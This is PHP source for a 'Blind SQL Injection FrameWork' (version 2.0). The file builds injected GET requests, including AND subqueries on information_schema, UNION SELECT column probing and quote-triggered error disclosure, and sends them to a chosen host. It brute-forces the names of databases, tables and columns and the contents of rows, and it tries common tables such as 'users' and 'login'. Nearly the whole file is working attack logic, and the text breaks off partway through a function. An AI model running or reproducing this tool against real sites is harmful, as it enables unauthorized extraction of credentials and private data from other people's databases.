<?php
/*
	Blind SQL Injection FrameWork
*/
define("BSIFW_VERSION", "2.0");				// Current <released> version

define("METHOD_HISTORY", 0);				// todo // INTERN ONLY - NOT ACCESSIBLE
define("METHOD_BRUTEFORCE", 1);				// Normal bruteforce
define("METHOD_BRUTEFORCE_SMART", 2);			// Use smart bruteforce queries
define("METHOD_CACHING", 3);				// Use caching method, if supported

// 0 = normal (only show final result)
// 1 = verbose
// 2 = more verbose
// 3 = attack query + url + caching status
// 4 = send + recvs + caching compare info
class framework
{
	// common
	public $debug = 2;				// Debug level
	private $error = null;				// Holds error message
	public function getError() {return $this->error;}

	// host
	private $host = null;				// Host to target
	private $port = null;				// Port to use
	private $path = null;				// Path to vuln id variable
	private $rest = null;				// Rest of the path, after vuln id variable
	public function getHost() {return $this->host;}
	public function getPort() {return $this->port;}
	public function getPath() {return $this->path;}
	public function getRest() {return $this->rest;}

	// method
	private $method = null;				// Method type
	public $methods = null;				// Methods to choose from, look below
	private $mparams = null;			// Parameters of method <id> argv
	private $regexp = null;				// Regexp string to use
	function getMethod() {return $this->method;}	// Returns current selected method

	// mysql
	public $space = "+";				// Space character to use in the query/request
	public $end = null;				// End character of the query/request
	private $interval = 200000;			// Interval between each request
	private $charlen = 40;				// Use this for bruteforcing
	private $charset = array(			// Charset to use when injecting, you can customize this if needed :)
				// page:	real page we found
				// hex:		hex/ascii char
				// len:		length if we're searching for length
				// MD5 password hash
				array("char" => "0", "length" => "0"),
				array("char" => "1", "length" => "1"),
				array("char" => "2", "length" => "2"),
				array("char" => "3", "length" => "3"),
				array("char" => "4", "length" => "4"),
				array("char" => "5", "length" => "5"),
				array("char" => "6", "length" => "6"),
				array("char" => "7", "length" => "7"),
				array("char" => "8", "length" => "8"),
				array("char" => "9", "length" => "9"),
				array("char" => "a", "length" => "10"),
				array("char" => "b", "length" => "11"),
				array("char" => "c", "length" => "12"),
				array("char" => "d", "length" => "13"),
				array("char" => "e", "length" => "14"),
				array("char" => "f", "length" => "15"),

				// Use this for usernames etc.
				array("char" => "g", "length" => "16"),
				array("char" => "h", "length" => "17"),
				array("char" => "i", "length" => "18"),
				array("char" => "j", "length" => "19"),
				array("char" => "k", "length" => "20"),
				array("char" => "l", "length" => "21"),
				array("char" => "m", "length" => "22"),
				array("char" => "n", "length" => "23"),
				array("char" => "o", "length" => "24"),
				array("char" => "p", "length" => "25"),
				array("char" => "q", "length" => "26"),
				array("char" => "r", "length" => "27"),
				array("char" => "s", "length" => "28"),
				array("char" => "t", "length" => "29"),
				array("char" => "u", "length" => "30"),
				array("char" => "v", "length" => "31"),
				array("char" => "w", "length" => "32"),
				array("char" => "x", "length" => "33"),
				array("char" => "y", "length" => "34"),
				array("char" => "z", "length" => "35"),

				// Add unicode or other chars here if needed
				array("char" => "_", "length" => "36"),
				array("char" => "-", "length" => "37"),
				array("char" => " ", "length" => "38"),
				array("char" => "@", "length" => "39")
	);
	public function getInterval() {return ($this->interval/1000);}
	public function getCharlen() {return $this->charlen;}
	public function getCharset() {return $this->charset;}

	// attack info
	public $qtype = null;				// Chosen attack type
	public $qtypes = null;				// Attack types, look below
	private $qparams = null;			// Parameters of attack <id> argv
	private $requests = 0;				// Amount of requests launched

	// getDatabaseInfo()
	private $common_tables = array(			// Common table names to target/bruteforce
					"users", 
					"login", 
					"members",
					"products",
					"media",
					"jobs"
				);

	// caching method
	private $cache_list = null;			// Holds all pages with the unique $cache_search matches
	private $cache_tmp_list = null;			// Holds all pages of the retrieved target (to search for $cache_search in case duplicate $cache_list found)
	private $cache_start = 0;			// ID number to start caching the target with
	private $cache_max_pages = 50;

	// internal file ptrs
	private $ofile = null;				// Output filename
	private $hfile = null;				// Handle to the logfile
	public function getFileHandle() {return $this->hfile;}

	// Target database info is stored here
	private $_db_info;					// Stores all info found

	/*
		==================================================================================================
		! Code start.                                                                                    !
		! End of hardcoded config :-)                                                                    !
		! Only edit below if you know what you are doing.                                                !
		==================================================================================================
	*/
	function __construct()
	{
		$this->ofile = "SQL_".date("Ymd_Hi").".log";
		$this->hfile = fopen($this->ofile, "w+");
		$this->methods = array(
					array("id" => 1, "descr" => "Use normal bruteforce method", "params" => "<regexp string>"),
					array("id" => 2, "descr" => "Use smart bruteforce queries", "params" => "<regexp string>"),
					array("id" => 3, "descr" => "Use caching method, if supported", "params" => "<start page> (end page)")
		);
		$this->qtypes = array(
					array("type" => 1, "descr" => "Count databases", "params" => "\t\t\t\t"),
					array("type" => 2, "descr" => "Get database name", "params" => "(index)\t\t\t"),
					array("type" => 3, "descr" => "Count tables in database", "params" => "db_name\t\t\t"),
					array("type" => 4, "descr" => "Get table name", "params" => "db_name (index)\t\t"),
					array("type" => 5, "descr" => "Count columns in table", "params" => "db_name table_name\t\t"),
					array("type" => 6, "descr" => "Get column name", "params" => "db_name table_name (index)\t"),
					array("type" => 7, "descr" => "Count rows in column", "params" => "db_name table_name column_name"),
					array("type" => 8, "descr" => "Get row data", "params" => "db_name table_name column_name (index)"),
					array("type" => 9, "descr" => "Do everything", "params" => "\t\t\t\t"),
					array("type" => 10, "descr" => "Get MySQL Version", "params" => "\t\t\t\t")
		);
	}

	function __destruct()
	{
		fclose($this->hfile);
	}

	public function log($text, $lvl=0)
	{
		if (intval($this->debug) >= $lvl)
		{
			if (strcmp(substr($text, strlen($text)-2, 2), "\r\n")) $text .= "\r\n";
			print($text);
			if ($this->hfile) fwrite($this->hfile, $text);
		}
	}

	public function setHost($host, $port=80)
	{
		// Clear cache list (new host/port = new content/cache)
		$this->reset();
		$this->host = $host;
		$this->port = $port;
		if (!isset($this->_db_info[$this->host]["name"])) $this->_db_info[$this->host]["name"] = $this->host;
		return true;
	}

	public function setPath($path, $rest=0)
	{
		// Clear cache list (new path = new content/cache)
		$this->reset();
		$this->path = $path;
		$this->rest = $rest;
		return true;
	}

	private function reset()
	{
		// Reset method
		$this->method = null;
		$this->mparams = null;
		if ($this->cache_list)
		{

			$this->cache_list = null;
			$this->cache_tmp_list = null;
			$this->cache_start = 0;
			$this->log("[*] Cache cleared", 0);
		}
	}

	public function setInterval($secs)
	{
		if (!$secs) $secs = 200;
		$this->interval = $secs*1000;
	}

	public function setCharlen($length)
	{
		$lencharset = count($this->charset);
		$lennew = intval($length);
		$this->charlen = ($lennew > $lencharset ? $lencharset : $lennew);
	}

	public function validateConfig()
	{
		if (!$this->host)
		{
			$this->error = "set host first";
			return false;
		}
		if (!$this->port)
		{
			$this->error = "set port first";
			return false;
		}
		if (!$this->path)
		{
			$this->error = "set path first";
			return false;
		}
		if (!$this->method)
		{
			$this->error = "set method first";
			return false;
		}
		if (!$this->qtype)
		{
			$this->error = "set attack type first";
			return false;
		}
		return true;
	}

	public function setMethod($method, $params)
	{
		$this->mparams = $params;
		$char = substr($this->path, strlen($this->path)-1, 1);
		switch ($method)
		{
			case METHOD_BRUTEFORCE:
			case METHOD_BRUTEFORCE_SMART:
			{
				if (!strncmp($char, '=', 1))
				{
					$this->error = "path can't end with '=', need id";
					return false;
				}
				$this->regexp = "";
				for ($i=0; $i<count($this->mparams); $i++)
				{
					$this->regexp .= $this->mparams[$i];
				}
				if (@preg_match($this->regexp, "test") === false)
				{
					$this->error = "invalid regexp string";
					return false;
				}
				$this->method = $method;
			}
			break;

			case METHOD_CACHING:
			{
				if (strncmp($char, '=', 1))
				{
					$this->error = "path needs to be ending with '=' (no id) for this method";
					return false;
				}
				$cstart = intval($this->mparams[0]);
				$cmax = (isset($this->mparams[1]) ? intval($this->mparams[1]) : $this->cache_max_pages);
				if ($cmax-$cstart < $this->charlen)
				{
					$this->error = "can't cache less pages than charset length, change charset length first or increase pages count";
					return false;
				}
				$this->cache_start = $cstart;
				$this->cache_max_pages = $cmax;
				$this->method = METHOD_CACHING;
				return $this->create_cache_list();
			}
			break;

			default:
				$this->mparams = null;
				$this->error = "invalid method supplied";
				return false;
		}
		return true;
	}

	public function start($params=0)
	{
		if ($params)
		{
			$this->qparams = (is_array($params) ? $params : split(" ", $params));
		}
		if (!$this->validateConfig()) return false;
		if ($this->qtype > count($this->qtypes))
		{
			$this->error = "attack query type not found";
			return false;
		}

		$found = false;
		$starttime = time();
		$this->error = null;
		$this->requests = 0;
		$this->log("[*] Attack started: \t".date("r"), 0);			// date("d-m-Y \@ H:i:s") is better?
		$this->log("[*] Target Host: \t".$this->getHost().":".$this->getPort(), 0);
		$this->log("[*] Target Path: \t".$this->getPath().$this->getRest(), 0);
		$this->log("[*] Attack Type: \t".$this->qtype." ".$this->qparams, 0);
		$this->log("[*] Attack Method: \t".$this->getMethod()." ".$this->mparams, 0);
		$this->log("[*] Space Character: \t".$this->space, 0);
		$this->log("[*] End Character: \t".$this->end, 0);
		$this->log("[*] Interval: \t\t".$this->getInterval(), 0);
		$this->log("[*] Charset Length: \t".$this->charlen, 0);
		$this->log("[*] Debug Level: \t".$this->debug."\r\n\r\n", 0);

		switch ($this->qtype)
		{
			case 1:
			{
				$c = $this->getDatabaseCount();
				if (!$c)
				{
					$this->error = "no databases found";
					return false;
				}
				$this->log("[+] Found $c databases", 0);
			}
			break;

			case 2:
			{
				$c = $this->getDatabaseCount();
				if (!$c)
				{
					$this->error = "no databases found";
					return false;
				}
				$this->log("[+] Found $c databases", 1);
				$db = (isset($this->qparams[0]) ? intval($this->qparams[0]) : -1);
				if ($db == -1)
				{
					for ($i=0; $i<$c; $i++)
					{
						$len = $this->getDatabaseNameLength($i);
						if (!$len)
						{
							$this->log("[-] No database name length found for database index $i", 0);
							continue;
						}
						$this->log("[+] Found database name length for database '$i': $len", 1);
						$name = $this->getDatabaseName($i, $len);
						if (!$name)
						{
							$this->log("[-] No database name found for database index $i with length $len", 0);
							continue;
						}
						$this->log("[+] Found database name for database '$i': $name", 0);
					}
				}
				else
				{
					$len = $this->getDatabaseNameLength($db);
					if (!$len)
					{
						$this->error = "no database name length found for database index $db";
						return false;
					}
					$this->log("[+] Found database name length: $len", 1);
					$name = $this->getDatabaseName($db, $len);
					if (!$name)
					{
						$this->error = "no database name found for database '$db' with length '$len'";
						return false;
					}
					$this->log("[+] Found database name for database '$db': $name", 0);
				}
			}
			break;

			case 3:
			{
				$db = $this->qparams[0];
				if (!$db)
				{
					$this->error = "set database first";
					return false;
				}
				$c = $this->getTableCount($db);
				if (!$c)
				{
					$this->error = "no tables found in database '$db'";
					return false;
				}
				$this->log("[+] Found $c tables in database '$db'", 0);
			}
			break;

			case 4:
			{
				$db = $this->qparams[0];
				if (!$db)
				{
					$this->error = "set database first";
					return false;
				}
				if (empty($this->qparams[1]))
				{
					$l = $this->getTableCount($db);
					if (!$l)
					{
						$this->error = "table count in database '$db' not found";
						return false;
					}
					$this->log("[+] Found $l tables in database '$db'", 1);
					for ($i=0; $i<$l; $i++)
					{
						$len = $this->getTableNameLength($db, $i);
						if (!$len)
						{
							$this->error = "table length not found";
							return false;
						}
						$this->log("[+] Found table length for table '$i': $len", 1);
						$name = $this->getTableName($db, $i, $len);
						if (!$name)
						{
							$this->error = "no table name found";
							return false;
						}
						$this->log("[+] Found table name for table '$i': $name", 0);
					}
				}
				else
				{
					$index = intval($this->qparams[1]);
					$len = $this->getTableNameLength($db, $index);
					if (!$len)
					{
						$this->error = "table length not found";
						return false;
					}
					$this->log("[+] Found table length for table '$index': $len", 1);
					$name = $this->getTableName($db, $index, $len);
					if (!$name)
					{
						$this->error = "no table name found";
						return false;
					}
					$this->log("[+] Found table name for table '$index': $name", 0);
				}
			}
			break;

			case 5:
			{
				$db = $this->qparams[0];
				$table = $this->qparams[1];
				if (!$db)
				{
					$this->error = "set database first";
					return false;
				}
				else if (!table)
				{
					$this->error = "set table first";
					return false;
				}
				$c = $this->getColumnCount($db, $table);
				if (!$c)
				{
					$this->error = "no column(s) found in table";
					return false;
				}
				$this->log("[+] Found $c columns in table '$table' for database '$db'", 1);
			}
			break;

			case 6:
			{
				$db = $this->qparams[0];
				$table = $this->qparams[1];
				if (!$db)
				{
					$this->error = "set database first";
					return false;
				}
				else if (!table)
				{
					$this->error = "set table first";
					return false;
				}
				if (empty($this->qparams[1]))
				{
					$l = $this->getColumnCount($db, $table);
					if (!$l)
					{
						$this->error = "column count in table '$table' for database '$db' not found";
						return false;
					}
					$this->log("[+] Found $l columns in table '$s' in database '$db'", 1);
					for ($i=0; $i<$l; $i++)
					{
						$len = $this->getColumnNameLength($db, $table, $i);
						if (!$len)
						{
							$this->error = "column name length not found";
							return false;
						}
						$this->log("[+] Found column name length for column '$i': $len", 1);
						$name = $this->getColumnName($db, $table, $i, $len);
						if (!$name)
						{
							$this->error = "no column name found";
							return false;
						}
						$this->log("[+] Found column name for column '$i': $name", 0);
					}
				}
				else
				{
					$index = intval($this->qparams[1]);
					$len = $this->getColumnNameLength($db, $table, $index);
					if (!$len)
					{
						$this->error = "column length not found";
						return false;
					}
					$this->log("[+] Found column length for column '$index': $len", 1);
					$name = $this->getColumnName($db, $table, $index, $len);
					if (!$name)
					{
						$this->error = "no column name found";
						return false;
					}
					$this->log("[+] Found column name for column '$index': $name", 0);
				}
			}
			break;

			case 7:
			{
				$db = $this->qparams[0];
				$table = $this->qparams[1];
				$column = $this->qparams[2];
				if (!$db)
				{
					$this->error = "set database first";
					return false;
				}
				else if (!table)
				{
					$this->error = "set table first";
					return false;
				}
				else if (!$column)
				{
					$this->error = "set column first";
					return false;
				}
				$c = $this->getRowCount($db, $table, $column);
				if (!$c)
				{
					$this->error = "no row(s) found in column";
					return false;
				}
				$this->log("[+] Found $c rows in column '$column' in table '$table' for database '$db'", 1);
			}
			break;

			case 8:
			{
				$db = $this->qparams[0];
				$table = $this->qparams[1];
				$column = $this->qparams[2];
				if (!$db)
				{
					$this->error = "set database first";
					return false;
				}
				else if (!table)
				{
					$this->error = "set table first";
					return false;
				}
				else if (!$column)
				{
					$this->error = "set column first";
					return false;
				}
				if (empty($this->qparams[1]))
				{
					$l = $this->getRowCount($db, $table, $column);
					if (!$l)
					{
						$this->error = "row count in column '$column' in table '$table' for database '$db' not found";
						return false;
					}
					$this->log("[+] Found $l rows in column '$column' in table '$s' in database '$db'", 1);
					for ($i=0; $i<$l; $i++)
					{
						$len = $this->getRowDataLength($db, $table, $column, $i);
						if (!$len)
						{
							$this->error = "row data length not found";
							return false;
						}
						$this->log("[+] Found row data length for row '$i': $len", 1);
						$name = $this->getRowData($db, $table, $column, $i, $len);
						if (!$name)
						{
							$this->error = "no row data found";
							return false;
						}
						$this->log("[+] Found row data for row '$i': $name", 0);
					}
				}
				else
				{
					$index = intval($this->qparams[1]);
					$len = $this->getRowDataLength($db, $table, $column, $index);
					if (!$len)
					{
						$this->error = "row data length not found";
						return false;
					}
					$this->log("[+] Found row data length for row '$index': $len", 1);
					$name = $this->getRowData($db, $table, $column, $index, $len);
					if (!$name)
					{
						$this->error = "no row data found";
						return false;
					}
					$this->log("[+] Found row data for row '$index': $name", 0);
				}
			}
			break;

			case 9:
			{
				if (!$this->getDatabaseInfo())
					return false;
			}
			break;

			case 10:
			{
				$this->log("[+] Found version: ".$this->getDatabaseVersion(), 0);
			}
			break;
		}
		$this->log("[*] Attack finished: \t".date("r"), 0);
		$this->log("[*] Generated ".$this->requests." request(s) over ".(time()-$starttime)." second(s)", 0);
		return true;
	}

	public function query_send($qry)
	{
		$qry = preg_replace("/[\t|\r|\n]+/", "", $qry);
		$this->log("[*] Attack URL: ".$this->host.$this->path.$qry.$this->rest, 3);
		$pkt = "GET ".$this->path.$qry.$this->rest." HTTP/1.0\r\n";
		$pkt .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)\r\n";
		$pkt .= "Host: ".$this->host."\r\n";
		$pkt .= "Connection: close\r\n\r\n";
		$data = $this->http_send($pkt);
		if (!$data || empty($data)) return false;

		// Return attack results
		switch ($this->method)
		{
			case METHOD_BRUTEFORCE:
			case METHOD_BRUTEFORCE_SMART:
			{
				return preg_match($this->regexp, $data);
			}
			break;

			case METHOD_CACHING:
			{
				return $this->search_cache_list($data);
			}
			break;
		}
		return true;
	}

	private function http_send($packet)
	{
		$sock = @fsockopen($this->host, $this->port);
		if (!$sock)
		{
			$this->error = "no response from ".$this->host.":".$this->port;
			return false;
		}
		$this->log("[*] SEND:\r\n$packet", 4);
		fputs($sock, $packet);
		$resp = '';
		while (!feof($sock)) $resp .= fread($sock, 1024);
		fclose($sock);
		$this->log("[*] RECV:\r\n$resp", 4);
		$resp = substr($resp, strpos($resp, "\r\n\r\n")+4);
		$this->requests += 1;
		usleep($this->interval);
		return $resp;
	}

	public function show_cache_list($level=2)
	{
		$this->log("page[index][id]index[num]needle[string]char[hex]", $level);
		for ($i=0; $i<count($this->cache_list); $i++)
		{
			$cpage = $this->cache_list[$i];
			$rpage = $cpage["page"];
			$char = $cpage["char"];
			$length = $cpage["length"];
			$needles = count($cpage["needles"]);
			for ($x=0; $x<$needles; $x++)
				$this->log("page[$i]real[$rpage]index[$x]needle[".$cpage["needles"][$x]."]char[$char]length[$length]", $level);
		}
	}

	private function create_cache_list()
	{
		$start = time();
		$cpages = count($this->cache_list);
		if ($this->cache_list)
		{
			$pages = $this->charlen-$cpages;
			if ($pages < 1)
			{
				$this->log("[*] Nothing extra to cache", 1);
				return true;
			}
			$this->log("[*] Caching $pages extra page(s)", 1);
		}
		$tcindex = count($this->cache_tmp_list);
		$fpages = $cpages;
		$pagenum = $this->cache_start;
		$this->log("[*] Creating cache list, please wait...", 1);
		while (true)
		{
			if ($pagenum == $this->cache_max_pages)
			{
				$this->log("[*] Reached page $pagenum - stopping with caching", 1);
				break;
			}
			else if ($fpages >= $this->charlen)
			{
				$this->log("[+] Found $fpages characters of total ".$this->charlen." - done", 1);
				break;
			}
			$this->log("getting page for cache index $tcindex", 3);
			for ($i=0; $i<count($this->cache_tmp_list); $i++)
			{
				if ($this->cache_tmp_list[$i]["page"] == $pagenum)
				{
					$i = 0;
					$pagenum++;
				}
			}
			$pkt = "GET ".$this->path.$pagenum.$this->rest." HTTP/1.0\r\n";
			$pkt .= "Host: ".$this->host."\r\n";
			$pkt .= "Connection: close\r\n\r\n";
			$data = $this->http_send($pkt);
			$data = preg_replace("/[\r|\t|\n]+/", " ", $data);
			$this->cache_tmp_list[$tcindex]["data"] = $data;
			$this->cache_tmp_list[$tcindex]["page"] = $pagenum;
			$nindex = 0;
			$needles = array();
			$strings = split(" ", $data);
			$this->log("cached real_page[$pagenum]cache_index[$tcindex]", 2);
			for ($a=0; $a<count($strings); $a++)
			{
				$unique = true;
				$needle = $strings[$a];
				if (empty($needle)) continue;
				$this->log("\ttrying to find index[$a]needle[$needle]page[$pagenum] in cached pages", 3);
				for ($b=0; $b<count($this->cache_tmp_list)-1; $b++)
				{
					$cached = $this->cache_tmp_list[$b];
					$data2 = $cached["data"];
					$strings2 = split(" ", $data2);
					$this->log("\t\ttrying cached_page[$b]data[$data2]", 3);
					for ($c=0; $c<count($strings2); $c++)
					{
						$needle2 = $strings2[$c];
						if (empty($needle2)) continue;
						$this->log("\t\t\tindex[$c]needle2[$needle2]cached_page[$b]", 3);
						if (!strcmp($needle2, $needle))
						{
							$unique = false;
							for ($d=0; $d<count($this->cache_tmp_list[$b]["needles"]); $d++)
							{
								if (!strcmp($needle2, $this->cache_tmp_list[$b]["needles"][$d]))
								{
									unset($this->cache_tmp_list[$b]["needles"][$d]);
									$this->cache_tmp_list[$b]["needles"] = array_values($this->cache_tmp_list[$b]["needles"]);
								}
							}
							$this->log("\t\t\t\tfound same needle[$needle] and needle2[$needle2] -- removed", 3);
						}
					}
				}
				if ($unique)
				{
					$this->log("found unique nindex[$nindex]needle[$needle] for cindex[$tcindex]", 3);
					$needles[$nindex] = $needle;
					$nindex++;
				}
			}
			if (count($needles))
			{
				$cset = $this->charset[$fpages];
				$this->log("found one or more needles for page[$pagenum]cache_index[$tcindex] of total length[".($fpages+1)."/".$this->charlen."]", 2);
				$this->cache_tmp_list[$tcindex]["char"] = $cset["char"];
				$this->cache_tmp_list[$tcindex]["length"] = $cset["length"];
				$this->cache_tmp_list[$tcindex]["page"] = $pagenum;
				$this->cache_tmp_list[$tcindex]["index"] = $fpages;
				$this->cache_tmp_list[$tcindex]["needles"] = $needles;
				$fpages++;
			}
			else
			{
				$this->log("cached page removed from cached list", 2);
				if ($fpages > 0)
					$fpages--;
				else
					$fpages = 0;
			}
			$tcindex++;
		}
		for ($i=0; $i<count($this->cache_tmp_list); $i++)
		{
			$page = $this->cache_tmp_list[$i];
			if (count($page["needles"]))
			{
				$index = $page["index"];
				$this->cache_list[$index]["char"] = $this->charset[$index]["char"];
				$this->cache_list[$index]["length"] = $this->charset[$index]["length"];
				$this->cache_list[$index]["page"] = $page["page"];
				$this->cache_list[$index]["needles"] = $page["needles"];
			}
		}
		$end = time();
		$length = count($this->cache_list);
		$total = count($this->cache_list, COUNT_RECURSIVE);
		$total -= $length;
//		$this->log("[*] Cache overview:", 2);
//		$this->show_cache_list(2);
		$this->log("[*] Cache length: $length", 1);
		$this->log("[*] Amount of needles in cache: $total", 1);
		$this->log("[*] Average needles per character: ".@round($total/$length), 1);
		$this->log("[*] Caching done, took ".($end-$start)." second(s)", 0);
		return true;
	}

	private function search_cache_list($page)
	{
		$page =  preg_replace("/(\r|\t|\n|\s)+/", " ", $page);
		$this->log("[*] Target page: $page", 3);
		$length = count($this->cache_list);
		$pneedles = split(" ", $page);
		for ($a=0; $a<count($pneedles); $a++)
		{
			$pneedle = $pneedles[$a];
			$this->log("[*] Looking for needle[$pneedle] in cache list", 4);
			for ($b=0; $b<$length; $b++)
			{
				$crpage = $this->cache_list[$b]["page"];		// Real page in cache
				$cchar = $this->cache_list[$b]["char"];			// Char for page in cache
				for ($c=0; $c<count($this->cache_list[$b]["needles"]); $c++)
				{
					$cneedle = $this->cache_list[$b]["needles"][$c];		// Needle for page in cache
					$this->log("[*] Comparing to real[$crpage]cached[$b]index[$c]needle[$cneedle]char[$cchar]", 4);
					if (!strcmp($pneedle, $cneedle))
					{
						$this->log("[+] Found real[$crpage]cached[$b]index[$c]needle[$cneedle]char[$cchar] in page[$crpage]", 3);
						return $this->cache_list[$b];
					}
				}
			}
		}
		return false;
	}

	private function getDatabaseInfo()
	{
		// local config/temp
		$tpath = null;		// Target script path
		$tquerycolumns = null;	// Amount of columns in table the target query uses
		$ctables = null;	// Common tables that exist in remote database
		$tables = null;		// Target tables count in current database
		$users = null;		// Target users that exist in mysql.user

		// information_schema
		$reg1 = "/denied\s[to|for]+\suser\s'(.*?)'@'(.*?)'\s[to|for]+\s[database|table]+\s'(.*?)'/i";
		$reg2 = "/\sdenied\sfor\suser\s'(.*?)'@'(.*?)'\sto\sdatabase\s'(.*?)'/i";
		$qry = $this->space."AND".$this->space.
		"(
			SELECT".$this->space."1".$this->space.
			"FROM".$this->space."information_schema.SCHEMATA
		)".$this->end;
		$qry = preg_replace("/[\t|\r|\n]+/", "", $qry);
		$pkt = "GET ".$this->path.$qry.$this->rest." HTTP/1.0\r\n";
		$pkt .= "Host: ".$this->host."\r\n";
		$pkt .= "Connection: close\r\n\r\n";
		$data = $this->http_send($pkt);
		$bexist = !preg_match($reg1, $data);
		$bread = !preg_match($reg2, $data, $info);
		if ($bexist && $bread)
		{
			$this->log("[+] We have read access to 'information_schema'", 0);
			$this->log("[*] Dumping database, please wait...", 0);
			$version = $this->getDatabaseVersion();
			if (!$version)
			{
				$db["version"] = "not found";
				$this->log("[-] Version not found on host '".$this->host."'", 0);
				$this->log("[?] Version not in cache or no version exists, try bruteforce to make sure!", 0);
				//break;?
			}
			$db["version"] = $version;
			$this->log("[+] Found MySQL version on host '".$this->host."': $version", 0);
			$databases = $this->getDatabaseCount();
			if (!$databases)
			{
				$db["databases"] = "not found";
				$this->log("[-] Database cound not found on host '".$this->host."'", 0);
				$this->log("[?] Database count not in cache or no databases exist, try bruteforce to make sure!", 0);
				//break;?
			}
			$db = array();
			$db["databases"] = $databases;
			$this->log("[+] Found $databases databases on host '".$this->host."'", 0);
			for ($a=0; $a<$databases; $a++)
			{
				$dlength = $this->getDatabaseNameLength($a);
				if (!$dlength)
				{
					$db[$a]["length"] = "not found";
					$this->log("[-] Database name length not found for database '$a' on host '".$this->host."'", 0);
					continue;
				}
				$db[$a]["length"] = $dlength;
				$this->log("[+] Found database name length for database '$a' on host '".$this->host."': $dlength", 0);
				$dname = $this->getDatabaseName($a, $dlength);
				if (!$dname)
				{
					$db[$a]["name"] = "not found";
					$this->log("[-] Database name not found for database '$a' on host '".$this->host."'", 0);
					continue;
				}
				$db[$a]["name"] = $dname;
				$this->log("[+] Found database name for database '$a' on host '".$this->host."': $dname", 0);
				$dtables = $this->getTableCount($dname);
				if (!$dtables)
				{
					$db[$a]["tables"] = "not found";
					$this->log("[-] Table count not found for database '$dname' on host '".$this->host."'", 0);
					$this->log("[?] Table count not in cache or no tables exist, try bruteforce to make sure!", 0);
					continue;
				}
				$db[$a]["tables"] = $dtables;
				$this->log("[+] Found table count for database '$dname' on host '".$this->host."': $dtables", 0);
				for ($b=0; $b<$dtables; $b++)
				{
					$tlength = $this->getTableNameLength($dname, $b);
					if (!$tlength)
					{
						$db[$a][$b]["length"] = "not found";
						$this->log("[-] Table name length not found for table '$b' in database '$dname' on host '".$this->host."'", 0);
						continue;
					}
					$db[$a][$b]["length"] = $tlength;
					$this->log("[+] Found table name length for table '$b' in database '$dname' on host '".$this->host."': $tlength", 0);
					$tname = $this->getTableName($dname, $b, $tlength);
					if (!$tname)
					{
						$db[$a][$b]["name"] = "not found";
						$this->log("[-] Table name not found for table '$b' in database '$dname' on host '".$this->host."'", 0);
						continue;
					}
					$db[$a][$b]["name"] = $tname;
					$this->log("[+] Found table name for table '$b' in database '$dname' on host '".$this->host."': $tname", 0);
					$tcolumns = $this->getColumnCount($dname, $tname);
					if (!$tcolumns)
					{
						$db[$a][$b]["columns"] = "not found";
						$this->log("[-] Column count not found for table '$tname' in database '$dname' on host '".$this->host."'", 0);
						$this->log("[?] Column count not in cache or no columns exist, try bruteforce to make sure!", 0);
						continue;
					}
					$db[$a][$b]["columns"] = $tcolumns;
					$this->log("[+] Found column count for table '$tname' in database '$dname' on host '".$this->host."': $tcolumns", 0);
					for ($c=0; $c<$tcolumns; $c++)
					{
						$clength = $this->getColumnNameLength($dname, $tname, $c);
						if (!$clength)
						{
							$db[$a][$b][$c]["length"] = "not found";
							$this->log("[-] Column name length not found for column '$b' in table '$tname' in database '$dname' on host '".$this->host."'", 0);
							continue;
						}
						$db[$a][$b][$c]["length"] = $clength;
						$this->log("[+] Found column name length for column '$b' in table '$tname' in database '$dname' on host '".$this->host."': $clength", 0);
						$cname = $this->getColumnName($dname, $tname, $c, $clength);
						if (!$cname)
						{
							$db[$a][$b][$c]["name"] = "not found";
							$this->log("[-] Column name not found for column '$cname' in table '$tname' in database '$dname' on host '".$this->host."'", 0);
							continue;
						}
						$db[$a][$b][$c]["name"] = $cname;
						$this->log("[+] Found column name for column '$c' in table '$tname' in database '$dname' on host '".$this->host."': $cname", 0);
						$crows = $this->getRowCount($dname, $tname, $cname);
						if ($crows > $db[$a][$b]["rows"])
							$db[$a][$b]["rows"] = $crows;
						else
							$crows = $db[$a][$b]["rows"];

						$this->log("[+] Found row count for column '$cname' in table '$tname' in database '$dname' on host '".$this->host."': $crows", 0);
/*						for ($d=0; $d<$crows; $d++)
						{
							$rlength = $this->getRowDataLength($dname, $tname, $cname, $d);
							if (!$rlength)
							{
								$this->log("[?] No data found at row '$d' in column '$cname' in table '$tname' in database '$dname' on host '".$this->host."'", 0);
								$db[$a][$b][$c][$d]["length"] = 0;
								$db[$a][$b][$c][$d]["data"] = null;
								continue;
							}
							$db[$a][$b][$c][$d]["length"] = $rlength;
							$data = $this->getRowData($dname, $tname, $cname, $d, $rlength);
							$this->log("[+] Found data for row '$d' in column '$cname' in table '$tname' in database '$dname' on host '".$this->host."': $data", 0);
							$db[$a][$b][$c][$d]["data"] = $data;
						}*/
					}
				}
			}
			$this->show_database_info();
			return true;
		}
//		else if (!$bexist)
//			$this->log("[-] MySQL version < 5 (table 'information_schema.TABLES' doesn't exist)", 0);
		else if (!$bread || !$bexist)
			$this->log("[-] Access denied for user '".$info[1]."'@'".$info[2]."' to database '".$info[3]."'", 0);
		else
			$this->log("[-] Something went terribly wrong", 0);

		$this->log("[*] Trying bruteforce...", 0);
		switch ($this->method)
		{
			case METHOD_BRUTEFORCE:
			{
				// start attacking
				$this->log("[*] Trying to get target script path", 0);
				$reg = "/resource\sin\s<b>(.*?)<\/b>\son\sline\s<b>/i";
				$qry = "%27".$this->end;
				$pkt = "GET ".$this->path.$qry.$this->rest." HTTP/1.0\r\n";
				$pkt .= "Host: ".$this->host."\r\n";
				$pkt .= "Connection: close\r\n\r\n";
				$data = $this->http_send($pkt);
				if (preg_match($reg, $data, $res))
				{
					$this->log("[*] Found path: ".$res[1], 0);
					$tpath = $res[1];
				}
				else
					$this->log("[-] Path not found", 0);

				$this->log("[*] Getting amount of columns in target query table", 0);
				$sub_qry = "UNION".$this->space."SELECT".$this->space."1";
				for ($i=1; $i<=30; $i++)
				{
					$this->log("[*] Trying $i column(s)", 1);
					if ($i != 1) $sub_qry .= ",$i";
					$qry = $this->space.$sub_qry.$this->end;
					if ($this->query_send($qry))
					{
						$this->log("[*] Found $i column(s) in target query table", 0);
						$tquerycolumns = $i;
						break;
					}
					else if ($this->error)
						return false;
				}
				if (!$tquerycolumns)
				{
					$tquerycolumns = 0;
					$this->log("[-] Amount of columns not found or above 30", 0);
				}

				$this->log("[*] Bruteforcing existing tables in common_tables list", 0);
				for ($i=0; $i<count($this->common_tables); $i++)
				{
					$tname = $this->common_tables[$i];
					$this->log("[*] Trying table: $tname", 2);
